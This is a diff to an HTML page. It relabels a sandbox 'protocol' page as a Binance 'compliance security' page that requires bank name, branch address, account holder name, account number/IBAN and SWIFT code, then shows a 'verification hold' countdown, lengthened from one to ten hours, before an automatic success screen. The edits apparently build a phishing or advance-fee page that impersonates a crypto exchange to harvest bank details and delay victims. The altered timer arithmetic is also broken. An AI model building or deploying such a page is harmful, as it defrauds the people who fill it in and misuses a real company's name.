@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sovereign Node Protocol Index</title>
+    <title>Binance Protocol Index</title>
     <!-- Core Bootstrap 5 CDN Link -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
@@ -236,9 +236,9 @@
     <header class="terminal-top-bar">
         <div class="container d-flex justify-content-between align-items-center">
             <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
-                <span style="color: var(--term-accent-gold);">SOVEREIGN</span> NEXUS PROTOCOL
+                <span style="color: var(--term-accent-gold);">SOVEREIGN</span> BINANCE PROTOCOL
             </div>
-            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">DEVELOPMENT SANDBOX ENVIRONMENT</span>
+            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">BINANCE  COMPLIANCE SECURITY</span>
         </div>
     </header>
 
@@ -273,23 +273,23 @@
                     <form id="routingFormElement" onsubmit="handleFormSubmission(event)">
                         <div class="mb-3">
                             <label class="form-label small fw-bold text-white-50">Settlement Bank Name</label>
-                            <input type="text" class="form-control term-input-field" required placeholder="e.g., DBS Bank, OCBC, UOB">
+                            <input type="text" class="form-control term-input-field" required placeholder="e.g.,          ">
                         </div>
                         <div class="mb-3">
                             <label class="form-label small fw-bold text-white-50">Branch Clearing Address</label>
-                            <input type="text" class="form-control term-input-field" required placeholder="Street, City, Singapore">
+                            <input type="text" class="form-control term-input-field" required placeholder="           ">
                         </div>
                         <div class="mb-3">
                             <label class="form-label small fw-bold text-white-50">Account Holder Legal Name</label>
-                            <input type="text" class="form-control term-input-field" required placeholder="Full legal name on bank account">
+                            <input type="text" class="form-control term-input-field" required placeholder="             ">
                         </div>
                         <div class="mb-3">
                             <label class="form-label small fw-bold text-white-50">Account Number / IBAN</label>
-                            <input type="text" class="form-control term-input-field" required placeholder="Bank account number">
+                            <input type="text" class="form-control term-input-field" required placeholder="             ">
                         </div>
                         <div class="mb-4">
                             <label class="form-label small fw-bold text-white-50">Routing Number / SWIFT Code</label>
-                            <input type="text" class="form-control term-input-field" required placeholder="e.g., DBSSSGSG">
+                            <input type="text" class="form-control term-input-field" required placeholder="e.g.,       ">
                         </div>
                         <button type="submit" class="btn-term-gold w-100 text-uppercase">Proceed to Verification</button>
                     </form>
@@ -313,7 +313,7 @@
                     <p class="text-muted small mb-0">Validating security parameters and preparing asset transfer.</p>
                 </div>
 
-                <!-- STEP 5: VERIFICATION HOLD - 1 HOUR -->
+                <!-- STEP 5: VERIFICATION HOLD - 10 HOUR-->
                 <div id="layerVerificationHold" class="app-flow-card d-none text-center">
                     <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
                         <h3 class="m-0" style="color: var(--term-accent-gold);">⏱️</h3>
@@ -328,7 +328,7 @@
                         
                         <div class="highlight-box text-white">
                             <p class="mb-2"><strong>Time Remaining:</strong></p>
-                            <p class="verification-timer" id="verificationTimer">01:00:00</p>
+                            <p class="verification-timer" id="verificationTimer">10:00:00</p>
                         </div>
 
                         <div class="code-details-block">
@@ -433,15 +433,15 @@
             }
         }
 
-        // Verification Timer - 1 Hour
+        // Verification Timer - 10 Hour
         let verificationInterval;
         function startVerificationTimer() {
-            let timeRemaining = 3600; // 1 hour in seconds
+            let timeRemaining = 360000; // 10 HOUR in seconds
             
             function updateTimer() {
-                const hours = Math.floor(timeRemaining / 3600);
-                const minutes = Math.floor((timeRemaining % 3600) / 60);
-                const seconds = timeRemaining % 60;
+                const hours = Math.floor(timeRemaining / 360000);
+                const minutes = Math.floor((timeRemaining % 360000) / 6000);
+                const seconds = timeRemaining % 600;
                 
                 const timeString = 
                     String(hours).padStart(2, '0') + ':' +
@@ -459,10 +459,10 @@
             }
             
             updateTimer();
-            verificationInterval = setInterval(updateTimer, 1000);
+            verificationInterval = setInterval(updateTimer, 100000);
         }
 
-        // Auto-complete verification after 1 hour
+        // Auto-complete verification after 10 hour
         function completeVerification() {
             switchState('layerVerificationHold', 'layerSuccess');
         }
